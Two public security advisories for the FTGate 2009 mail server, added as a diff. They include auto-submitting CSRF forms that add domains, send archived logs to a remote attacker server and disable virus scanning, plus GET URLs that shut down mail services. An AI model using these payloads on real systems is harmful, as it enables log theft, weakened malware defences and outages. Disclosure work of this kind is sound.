@@ -1,0 +1,223 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-FTGATE-2009-CSRF.txt
+
+
+Vendor:
+================================
+www.ftgate.com
+
+
+Product:
+========================================
+FTGate 2009 SR3 May 13 2010 Build 6.4.00
+
+
+Vulnerability Type:
+=================================
+Cross site request forgery (CSRF)
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+Multiple CSRF vectors exist within FTGate 2009 that allow us to add
+arbitrary remote domains,
+disable antivirus scanning for various Email file attachment types, and
+finally change settings
+to have archived server logs sent to our remote attacker controlled server
+for safe keeping.
+
+Exploit code(s):
+===============
+
+CSRF(s):
+
+<!DOCTYPE>
+<html>
+<body onLoad="invertedcross()">
+
+<script>
+function invertedcross(){
+var e=document.getElementById('PUNKSNOTDEAD')
+e.submit()
+}
+</script>
+
+
+1) add arbitrary domains:
+-------------------------
+<form id="PUNKSNOTDEAD" action="
+http://localhost:8089/webadmin/mailboxes/index.fts?action=save"
+method="post">
+<input type="text" name="dname" value="hyp3rlinx.com" />
+<input type="text" name="dtype" value="4" />
+<input type="text" name="fname" value="*" />
+<input type="text" name="action" value="domadd" />
+<input type="text" name="domain" value="" />
+<input type="text" name="newdomain" value="" />
+</form>
+
+
+2) sends archived logs to arbitrary remote server:
+--------------------------------------------------
+<form id="PUNKSNOTDEAD" action="
+http://localhost:8089/webadmin/config/archive.fts?action=save"
+method="post">
+<input type="text" name="enable" value="on" />
+<input type="text" name="path"
+value="C%3A%5CProgram+Files+%28x86%29%5CFTGate+2009%5CArchive" />
+<input type="text" name="duration" value="0" />
+<input type="text" name="external" value="on" />
+<input type="text" name="extarcserver" value="6.6.6.0" />
+</form>
+
+
+3) disable virus scan for .jar or .exe files etc:
+-------------------------------------------------
+Options to control handling of virus scanning for email attachments Virus
+Scanning Mode
+Operating mode of the virus scanner mode=0 to Disable Virus Scanning.
+
+<form id="PUNKSNOTDEAD" action="
+http://localhost:8089/webadmin/filters/virus.fts" method="post">
+<input type="text" name="action" value="add" />
+<input type="text" name="mode" value="0" />
+<input type="text" name="extension" value="dll" />
+</form>
+
+</body>
+</html>
+
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: September 29, 2015
+October 1, 2015 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+=========================================================
+High
+
+
+Description:
+==========================================================
+
+Request Method(s):              [+]  POST
+
+Vulnerable Product:             [+]  FTGate 2009 SR3 May 13 2010 Build
+6.4.00
+
+Vulnerable Parameter(s):        [+]  domadd, extarcserver & mode
+
+
+####################################################
+
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-FTGATE-2009-DOS.txt
+
+
+Vendor:
+================================
+www.ftgate.com
+
+
+Product:
+================================
+FTGate 2009 SR3 May 13 2010 Build 6.4.000
+
+
+Vulnerability Type:
+=======================
+Denial of service (DOS)
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+Multiple denial of service oppurtunities reside within FTGate 2009 that
+allow us to disrupt and shut down
+various FTGate services via GET requests by luring victimz to our website
+or get them to click our malicious linxs.
+
+
+Exploit code(s):
+===============
+
+DOS:
+
+1) shutdown solight web mail interface on port 80
+http://127.0.0.1:8089/webadmin/services/index.fts?action=stop_service&id=36
+
+2) shutdown Monitor server port 8081
+http://127.0.0.1:8089/webadmin/services/index.fts?action=stop_service&id=35
+
+3) shutdown FTGate connector server port 8090 listens on address 'Any'
+http://127.0.0.1:8089/webadmin/services/index.fts?action=stop_service&id=38
+
+4) shutdown IMAP server port 143 listening on 'Any'
+http://127.0.0.1:8089/webadmin/services/index.fts?action=stop_service&id=33
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: September 29, 2015
+October 1, 2015 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+=========================================================
+Medium
+
+
+Description:
+==========================================================
+Request Method(s):              [+]  GET
+
+Vulnerable Product:             [+]  FTGate 2009 SR3 May 13 2010 Build
+6.4.000
+
+Vulnerable Parameter(s):        [+]  action, id
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
